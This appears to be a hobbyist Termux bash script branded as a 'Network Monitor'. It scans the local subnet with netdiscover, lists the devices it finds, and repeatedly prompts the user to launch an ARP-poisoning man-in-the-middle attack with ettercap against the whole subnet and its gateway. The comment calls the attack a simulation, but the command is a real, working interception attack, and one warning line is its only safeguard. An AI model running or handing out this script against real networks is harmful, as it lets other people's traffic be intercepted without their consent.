#!/data/data/com.termux/files/usr/bin/bash

# Color codes for better design and output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
NC='\033[0m' # No color

# Special light effect for design (Simple representation)
light_effect() {
    for i in {1..5}
    do
        echo -e "${CYAN}>>> Light Ray Effect: Active <<<${NC}"
        sleep 1
    done
}

# Header function with figlet & toilet for beautiful design
header() {
    clear
    figlet -f slant "Network Monitor" | toilet -f term --gay
    echo -e "${CYAN}-----------------------------------------------------${NC}"
    echo -e "${GREEN}    Real-time Network & MITM Tool (v1.0) ${NC}"
    echo -e "${CYAN}-----------------------------------------------------${NC}"
}

# Function to scan devices on the network
scan_devices() {
    echo -e "${YELLOW}Scanning for devices on the network...${NC}"
    netdiscover -r 192.168.1.0/24 -P > /data/data/com.termux/files/home/device_scan.txt
    echo -e "${GREEN}Device Scan Complete!${NC}"
}

# Function to display connected devices info
device_info() {
    echo -e "${YELLOW}Connected Devices:${NC}"
    cat /data/data/com.termux/files/home/device_scan.txt
}

# Function to simulate MITM attack (Just an example)
mitm_attack() {
    echo -e "${RED}Initiating MITM Attack...${NC}"
    echo -e "${YELLOW}Warning: Only run this on your own network for testing purposes.${NC}"
    ettercap -T -q -i wlan0 -M arp:remote /192.168.1.0/24// /192.168.1.1//
}

# Function to display logs and statistics
display_logs() {
    echo -e "${CYAN}Logs and Statistics:${NC}"
    echo -e "${GREEN}Total Devices Found: $(cat /data/data/com.termux/files/home/device_scan.txt | wc -l)${NC}"
    echo -e "${YELLOW}Device Details:${NC}"
    cat /data/data/com.termux/files/home/device_scan.txt
    echo
}

# Main function to run the network monitor with real-time updates
run_network_monitor() {
    while true
    do
        header
        scan_devices
        device_info
        display_logs
        
        # Calling light effect to give a visual feel of "light rays"
        light_effect
        
        read -p "Do you want to start MITM attack? (y/n): " choice
        if [ "$choice" == "y" ]; then
            mitm_attack
        fi
        
        echo -e "${CYAN}Waiting for next update...${NC}"
        sleep 60 # Update every 1 minute
    done
}

# Call the function to start the network monitor
run_network_monitor
